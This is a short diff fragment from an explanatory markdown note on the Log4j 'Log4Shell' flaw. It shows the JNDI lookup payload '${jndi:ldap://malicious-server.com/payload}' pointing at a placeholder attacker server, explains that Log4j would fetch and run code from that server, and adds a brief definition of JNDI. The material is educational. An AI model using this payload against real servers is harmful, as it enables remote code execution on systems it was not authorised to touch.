@@ -15,3 +15,10 @@
 User: ${jndi:ldap://malicious-server.com/payload}
 ```
 Log4j wouldn't treat this as text. It would interpret it and actually make a network request to the attackers server and executes whatever code it recieved.
+
+## What is JNDI?
+- JNDI stands for **Java Naming & Directory Interface**.
+- A system to fetch:
+  - Data
+  - Objects
+  - Configurations
